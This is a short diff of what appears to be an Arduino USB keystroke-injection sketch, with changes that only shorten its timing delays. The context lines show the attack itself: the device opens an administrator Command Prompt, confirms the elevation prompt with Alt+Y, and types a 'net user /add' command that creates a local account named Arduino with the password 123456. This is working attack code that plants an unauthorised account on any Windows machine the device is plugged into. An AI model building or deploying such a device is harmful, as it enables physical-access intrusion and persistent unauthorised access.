@@ -17,14 +17,14 @@ void setup()
 
   // launch Command Prompt (Admin)
   typeKey('a');
-  delay(3000);
+  delay(500);
 
   // klik "Yes"
   Keyboard.press(KEY_LEFT_ALT);
   delay(500);
   Keyboard.press('y');
   Keyboard.releaseAll();
-  delay(1000);
+  delay(500);
 
   // add user
   Keyboard.println("net user /add Arduino 123456");
